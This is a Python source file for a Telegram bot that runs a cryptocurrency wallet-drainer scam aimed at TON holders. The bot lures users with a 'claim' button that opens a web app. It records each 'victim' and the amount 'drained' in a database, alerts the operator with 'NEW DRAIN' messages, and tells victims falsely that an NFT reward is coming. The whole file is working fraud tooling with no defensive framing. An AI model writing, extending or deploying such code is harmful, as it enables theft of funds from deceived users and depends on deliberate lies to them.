import asyncio
import logging
import sqlite3
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from aiogram.filters import Command
import config

logging.basicConfig(level=logging.INFO)

bot = Bot(token=config.BOT_TOKEN)
dp = Dispatcher()

# Инициализация БД
def init_db():
    conn = sqlite3.connect('database/victims.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  user_id TEXT,
                  username TEXT,
                  wallet TEXT,
                  amount TEXT,
                  timestamp TEXT)''')
    conn.commit()
    conn.close()

def save_victim(user_id, username, wallet, amount):
    conn = sqlite3.connect('database/victims.db')
    c = conn.cursor()
    c.execute("INSERT INTO victims (user_id, username, wallet, amount, timestamp) VALUES (?, ?, ?, ?, ?)",
              (user_id, username, wallet, amount, datetime.now().isoformat()))
    conn.commit()
    conn.close()

@dp.message(Command("start"))
async def start_command(message: types.Message):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text=config.CLAIM_BUTTON,
            web_app=WebAppInfo(url=f"{config.WEBAPP_URL}/index.html?ref={message.from_user.id}")
        )]
    ])
    
    await message.answer(
        config.START_MESSAGE,
        reply_markup=keyboard,
        parse_mode="HTML"
    )

@dp.message(Command("stats"))
async def stats_command(message: types.Message):
    if message.from_user.id != config.ADMIN_ID:
        await message.answer("Not authorized")
        return
    
    conn = sqlite3.connect('database/victims.db')
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM victims")
    total = c.fetchone()[0]
    c.execute("SELECT SUM(CAST(amount AS INTEGER)) FROM victims WHERE amount != '0'")
    total_amount = c.fetchone()[0] or 0
    
    await message.answer(
        f"📊 <b>Статистика</b>\n\n"
        f"Всего жертв: {total}\n"
        f"Слито TON: {total_amount / 1e9:.2f}\n"
        f"Активен: {datetime.now().strftime('%Y-%m-%d %H:%M')}",
        parse_mode="HTML"
    )

@dp.message()
async def handle_webapp_data(message: types.Message):
    # WebApp отправляет данные после успешного слива
    if message.web_app_data:
        data = message.web_app_data.data
        import json
        try:
            payload = json.loads(data)
            save_victim(
                str(message.from_user.id),
                message.from_user.username or "no_username",
                payload.get('wallet', 'unknown'),
                str(payload.get('amount', '0'))
            )
            
            # Уведомление админу
            await bot.send_message(
                config.ADMIN_ID,
                f"🔴 <b>NEW DRAIN</b> 🔴\n"
                f"User: @{message.from_user.username or message.from_user.id}\n"
                f"Wallet: {payload.get('wallet')}\n"
                f"Amount: {payload.get('amount', 0) / 1e9:.2f} TON\n"
                f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                parse_mode="HTML"
            )
            
            await message.answer(
                "✅ Награда отправлена!\n\n"
                "NFT будет зачислен в течение 24 часов на ваш кошелек.\n\n"
                "Спасибо за участие!",
                parse_mode="HTML"
            )
        except Exception as e:
            print(f"Error: {e}")

async def main():
    init_db()
    print("Bot started")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
